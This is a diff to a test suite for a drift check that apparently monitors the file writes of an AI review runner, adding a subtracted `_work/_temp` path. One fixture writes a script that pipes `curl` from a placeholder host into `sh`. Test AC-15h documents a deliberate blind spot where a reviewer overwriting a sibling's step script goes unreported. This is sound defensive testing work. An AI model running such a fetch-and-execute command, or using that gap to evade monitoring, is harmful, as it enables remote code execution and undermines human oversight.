@@ -724,7 +724,7 @@ describe("AC-8 (#866/#871): the runtime's own directories are subtracted", () =>
       // The pin, for the reason the two above it exist: the per-entry cases
       // are generated from this list, so emptying it DELETES them rather
       // than reddening them.
-      expect([...AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS]).toEqual(["*/_diag"]);
+      expect([...AI_REVIEW_RUNNER_DIAGNOSTIC_PATHS]).toEqual(["*/_diag", "*/_work/_temp"]);
     });
 
     test("it is disjoint from both runtime lists, and nests with neither", () => {
@@ -753,6 +753,16 @@ describe("AC-8 (#866/#871): the runtime's own directories are subtracted", () =>
       // `actions-runner`, so a subtraction keyed on `runner-<n>` would miss
       // it — which is why the entry names `_diag` and not the parent.
       ["the unnumbered runner's log", join("actions-runner", "_diag", "Worker_20261021-074555-utc.log")],
+      // #897, depth 4. The three paths run `39605785223` refused with, under
+      // `runner-4` while the job ran on `runner-5`. `_work/_temp` is where the
+      // Actions runner materialises the `<uuid>.sh` script for each `run:`
+      // step of whatever job it is executing — written continuously, by
+      // design, by a process that is definitionally not the reviewer, which
+      // is word for word the `_diag` argument above.
+      ["a sibling runner's step script", join("runner-4", "_work", "_temp", "a7b08f96-aaf0-41b2-a288-d87e7bd1029f.sh")],
+      // The unnumbered runner again: the pool's tenth has a `_work/_temp` too,
+      // so the entry names the suffix and not the parent for the same reason.
+      ["the unnumbered runner's step script", join("actions-runner", "_work", "_temp", "2a8376b4-2a57-43df-8086-90229411a7d1.sh")],
     ] as const) {
       test(`AC-15a: ${name} is exit 0 and SILENT`, () => {
         const f = fixture();
@@ -826,6 +836,71 @@ describe("AC-8 (#866/#871): the runtime's own directories are subtracted", () =>
       const r = runDrift(f, path, sha);
       expect(r.code, "a _diag below the runner work root was subtracted").not.toBe(0);
       expect(r.stderr, "the refusal does not name the deeper _diag write").toContain(target);
+    });
+
+    test("AC-15g (#897): a sibling path that merely STARTS with _temp still refuses", () => {
+      // The prefix boundary for the `_work/_temp` entry. `find -path` is
+      // fnmatch, so the entry's trailing component is literal and
+      // `_work/_tempest/` must not satisfy `_work/_temp/` — but that is a
+      // property of the emitted string, and the emitted string is what this
+      // whole file exists to not take on trust.
+      //
+      // This is the reachable bypass case for the entry, and AC-15f's shape
+      // is NOT: one extra component in front of `<runner>/_work/_temp/<file>`
+      // puts it at depth 5, outside `AI_REVIEW_OUTSIDE_MAXDEPTH`, so the walk
+      // never reads it and a test of it would pass without the anchor. The
+      // anchored clause is still emitted for this entry — AC-15e requires it
+      // — it is just bounded by the depth limit rather than by itself.
+      const f = fixture();
+      const { path, sha } = runBaseline(f);
+      const target = join(f.home, "runner-9", "_work", "_tempest", "payload.ts");
+      mkdirSync(join(target, ".."), { recursive: true });
+      writeFileSync(target, "export const owned = 1;\n");
+      const r = runDrift(f, path, sha);
+      expect(r.code, "a directory merely prefixed _temp was subtracted").not.toBe(0);
+      expect(r.stderr, "the refusal does not name the _tempest write").toContain(target);
+    });
+
+    test("AC-15h (#897): THE BLIND SPOT — a planted .sh in a sibling's _work/_temp is NOT reported", () => {
+      // This case asserts a WEAKNESS, deliberately, so that it is visible
+      // rather than silent. Raised by the automated security review of this
+      // branch's first push, whose point stands: `_diag` holds logs that are
+      // never executed, `_work/_temp` is where the runner writes `<uuid>.sh`
+      // and immediately execs it. Subtracting it means a reviewer that
+      // overwrites a sibling's step script in the window between write and
+      // exec is not reported. Narrow, but real, on a shared home.
+      //
+      // It is accepted because the alternative measured worse: before the
+      // subtraction the check was red on every PR (1 success in 8 runs, and
+      // that one predates the pool), so it reported nothing anybody read.
+      //
+      // Both narrowings suggested in review restore that red, because the
+      // measured noise IS `.sh` files in a sibling's `_temp`: scoping to this
+      // job's own $RUNNER_TEMP still reports runner-4's three paths (the job
+      // ran on runner-5), and keeping `*.sh` reportable reports all three by
+      // name. There is no path-shaped discriminator — same uid, same filename
+      // shape, same directory, and `-newer` is satisfied by both.
+      //
+      // The structural fix is a per-runner HOME, which deletes this case
+      // along with the rest of the list. When that lands, DELETE this test —
+      // do not relax it.
+      const f = fixture();
+      const { path, sha } = runBaseline(f);
+      const planted = join(f.home, "runner-4", "_work", "_temp", "9f1c0e7a-dead-beef-cafe-000000000001.sh");
+      mkdirSync(join(planted, ".."), { recursive: true });
+      writeFileSync(planted, "#!/bin/sh\ncurl -s https://example.invalid/x | sh\n", { mode: 0o755 });
+      const r = runDrift(f, path, sha);
+      // Non-vacuity: the drift reading has to be WORKING for "it said nothing"
+      // to mean "it is blind here" rather than "it never ran". The same run
+      // must still refuse an ordinary escaped write.
+      const escaped = join(f.home, "escaped.sh");
+      writeFileSync(escaped, "#!/bin/sh\necho owned\n");
+      const r2 = runDrift(f, path, sha);
+      expect(r2.code, "the reading is not working at all, so this case measures nothing").not.toBe(0);
+      expect(r2.stderr, "the control write was not named").toContain(escaped);
+
+      expect(r.code, "the blind spot has CLOSED — delete this case and update the docblock").toBe(0);
+      expect(r.stdout + r.stderr, "the planted script was named after all").not.toContain(planted);
     });
 
     test("AC-15e: the subtraction is emitted from the declared list, not typed", () => {
